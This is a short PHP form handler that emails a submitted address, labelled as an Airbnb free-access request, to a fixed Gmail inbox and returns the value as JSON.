<?php
$mail = $_POST['mail_modal'];

$to_email = 'mrsmileball@gmail.com';
$subject = 'Airbnb Mail';
$message = 'Airbnb request free access. Main - ' . $mail;
$headers = 'From: gfa779@hotmail.com';
mail($to_email,$subject,$message,$headers);

$result = array(
    'mail_modal' => $_POST["mail_modal"]
);
echo json_encode($result);

?>